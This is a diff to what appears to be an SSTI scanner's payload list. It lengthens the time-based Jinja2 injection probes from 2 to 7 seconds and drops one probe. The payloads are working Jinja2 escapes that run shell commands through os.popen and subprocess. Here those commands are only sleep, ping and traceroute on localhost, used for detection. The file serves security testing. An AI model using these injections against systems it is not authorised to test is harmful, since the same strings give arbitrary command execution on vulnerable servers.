@@ -31,19 +31,19 @@
         },
         {
             "payload":[
-                "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('sleep 2').read()}}",
-                "{{cycler.__init__.__globals__.os.popen(\"sleep 2\")}}",
-                "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ping -i 1 -c 3 localhost').read()}}",
-                "{{cycler.__init__.__globals__.os.popen('ping -i 1 -c 3 localhost')}}",
-                "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('traceroute -z 3 localhost').read()}}",
-                "{{cycler.__init__.__globals__.os.popen('traceroute -z 3 localhost')}}",
-                "{{''.__class__.mro()[1].__subclasses__()[396]('sleep 2',shell=True,stdout=-1).communicate()[0].strip()}}",
-                "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"sleep 2\").read()}}{%endif%}{% endfor %}",
-                "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('sleep 2').read()}}{%endif%}{% endfor %}"
+                "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('sleep 7').read()}}",
+                "{{cycler.__init__.__globals__.os.popen(\"sleep 7\")}}",
+                "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ping -i 1 -c 7 localhost').read()}}",
+                "{{cycler.__init__.__globals__.os.popen('ping -i 1 -c 7 localhost')}}",
+                "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('traceroute -z 7 localhost').read()}}",
+                "{{cycler.__init__.__globals__.os.popen('traceroute -z 7 localhost')}}",
+                "{{''.__class__.mro()[1].__subclasses__()[396]('sleep 7',shell=True,stdout=-1).communicate()[0].strip()}}",
+                "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"sleep 7\").read()}}{%endif%}{% endfor %}",
+                "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('sleep 7').read()}}{%endif%}{% endfor %}"
             ],
             "tags": ["jinja2"],
             "type": "TIME",
-            "verify": [2]
+            "verify": [7]
         },
         {
             "payload":[
@@ -100,7 +100,6 @@
         },
         {
             "payload":[
-                "{% if [RANDOM_6] == [RANDOM_6] %}[RANDOM_6][RANDOM_6]{% endif %}",
                 "{%print([RANDOM_6],[RANDOM_6],[RANDOM_5])%}"
             ],
             "tags":["jinja2"],
